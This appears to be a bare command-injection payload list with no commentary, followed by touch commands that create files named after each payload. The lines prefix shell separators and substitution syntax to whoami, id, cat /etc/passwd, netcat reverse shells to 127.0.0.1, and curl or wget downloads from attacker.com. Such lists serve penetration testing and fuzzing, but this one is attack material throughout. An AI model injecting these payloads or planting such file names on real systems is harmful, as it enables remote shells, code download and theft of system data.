;whoami
&&whoami
||whoami
|whoami
;id
&&id
||id
|id
;nc -e /bin/sh 127.0.0.1 4444
&&nc -e /bin/sh 127.0.0.1 4444
||nc -e /bin/sh 127.0.0.1 4444
|nc -e /bin/sh 127.0.0.1 4444
;bash
&&bash
||bash
|bash
;curl http://attacker.com/shell
&&curl http://attacker.com/shell
||curl http://attacker.com/shell
|curl http://attacker.com/shell
;`whoami`
$(whoami)
;`id`
$(id)
;`nc -e /bin/sh 127.0.0.1 4444`
$(nc -e /bin/sh 127.0.0.1 4444)
;`bash`
$(bash)
;`curl http://attacker.com/shell`
$(curl http://attacker.com/shell)
;sh
&&sh
||sh
|sh
;netcat -e /bin/bash 127.0.0.1 4444
&&netcat -e /bin/bash 127.0.0.1 4444
||netcat -e /bin/bash 127.0.0.1 4444
|netcat -e /bin/bash 127.0.0.1 4444
;ping -c 1 attacker.com
&&ping -c 1 attacker.com
||ping -c 1 attacker.com
|ping -c 1 attacker.com
;wget http://attacker.com/shell
&&wget http://attacker.com/shell
||wget http://attacker.com/shell
|wget http://attacker.com/shell
;$(whoami)
&&$(whoami)
||$(whoami)
|$(whoami)
;$(id)
&&$(id)
||$(id)
|$(id)
;echo $USER
&&echo $USER
||echo $USER
|echo $USER
;cat /etc/passwd
&&cat /etc/passwd
||cat /etc/passwd
|cat /etc/passwd
;$(nc -e /bin/sh 127.0.0.1 5555)
&&$(nc -e /bin/sh 127.0.0.1 5555)
||$(nc -e /bin/sh 127.0.0.1 5555)
|$(nc -e /bin/sh 127.0.0.1 5555)
;bash -c "whoami"
&&bash -c "whoami"
||bash -c "whoami"
|bash -c "whoami"
;sh -c "id"
&&sh -c "id"
||sh -c "id"
|sh -c "id"
;bash -i
&&bash -i
||bash -i
|bash -i
;$(curl http://attacker.com/shell.sh)
&&$(curl http://attacker.com/shell.sh)
||$(curl http://attacker.com/shell.sh)
|$(curl http://attacker.com/shell.sh)
;nc 127.0.0.1 4444 -e /bin/bash
&&nc 127.0.0.1 4444 -e /bin/bash
||nc 127.0.0.1 4444 -e /bin/bash
|nc 127.0.0.1 4444 -e /bin/bash
;whoami > /tmp/out
&&whoami > /tmp/out
||whoami > /tmp/out
|whoami > /tmp/out
;id > /tmp/id
&&id > /tmp/id
||id > /tmp/id
|id > /tmp/id


# Create files with touch
touch ';whoami'
touch '&&whoami'
touch '||whoami'
touch '|whoami'
touch ';id'
touch '&&id'
touch '||id'
touch '|id'
touch ';nc -e /bin/sh 127.0.0.1 4444'
touch '&&nc -e /bin/sh 127.0.0.1 4444'
touch '||nc -e /bin/sh 127.0.0.1 4444'
touch '|nc -e /bin/sh 127.0.0.1 4444'
touch ';bash'
touch '&&bash'
touch '||bash'
touch '|bash'
touch ';curl http://attacker.com/shell'
touch '&&curl http://attacker.com/shell'
touch '||curl http://attacker.com/shell'
touch '|curl http://attacker.com/shell'
touch ';\`whoami\`'
touch '$(whoami)'
touch ';\`id\`'
touch '$(id)'
touch ';\`nc -e /bin/sh 127.0.0.1 4444\`'
touch '$(nc -e /bin/sh 127.0.0.1 4444)'
touch ';\`bash\`'
touch '$(bash)'
touch ';\`curl http://attacker.com/shell\`'
touch '$(curl http://attacker.com/shell)'
touch ';sh'
touch '&&sh'
touch '||sh'
touch '|sh'
touch ';netcat -e /bin/bash 127.0.0.1 4444'
touch '&&netcat -e /bin/bash 127.0.0.1 4444'
touch '||netcat -e /bin/bash 127.0.0.1 4444'
touch '|netcat -e /bin/bash 127.0.0.1 4444'
touch ';ping -c 1 attacker.com'
touch '&&ping -c 1 attacker.com'
touch '||ping -c 1 attacker.com'
touch '|ping -c 1 attacker.com'
touch ';wget http://attacker.com/shell'
touch '&&wget http://attacker.com/shell'
touch '||wget http://attacker.com/shell'
touch '|wget http://attacker.com/shell'
touch ';$(whoami)'
touch '&&$(whoami)'
touch '||$(whoami)'
touch '|$(whoami)'
touch ';$(id)'
touch '&&$(id)'
touch '||$(id)'
touch '|$(id)'
touch ';echo $USER'
touch '&&echo $USER'
touch '||echo $USER'
touch '|echo $USER'
touch ';cat /etc/passwd'
touch '&&cat /etc/passwd'
touch '||cat /etc/passwd'
touch '|cat /etc/passwd'
touch ';$(nc -e /bin/sh 127.0.0.1 5555)'
touch '&&$(nc -e /bin/sh 127.0.0.1 5555)'
touch '||$(nc -e /bin/sh 127.0.0.1 5555)'
touch '|$(nc -e /bin/sh 127.0.0.1 5555)'
touch ';bash -c "whoami"'
touch '&&bash -c "whoami"'
touch '||bash -c "whoami"'
touch '|bash -c "whoami"'
touch ';sh -c "id"'
touch '&&sh -c "id"'
touch '||sh -c "id"'
touch '|sh -c "id"'
touch ';bash -i'
touch '&&bash -i'
touch '||bash -i'
touch '|bash -i'
touch ';$(curl http://attacker.com/shell.sh)'
touch '&&$(curl http://attacker.com/shell.sh)'
touch '||$(curl http://attacker.com/shell.sh)'
touch '|$(curl http://attacker.com/shell.sh)'
touch ';nc 127.0.0.1 4444 -e /bin/bash'
touch '&&nc 127.0.0.1 4444 -e /bin/bash'
touch '||nc 127.0.0.1 4444 -e /bin/bash'
touch '|nc 127.0.0.1 4444 -e /bin/bash'
touch ';whoami > /tmp/out'
touch '&&whoami > /tmp/out'
touch '||whoami > /tmp/out'
touch '|whoami > /tmp/out'
touch ';id > /tmp/id'
touch '&&id > /tmp/id'
touch '||id > /tmp/id'
touch '|id > /tmp/id'
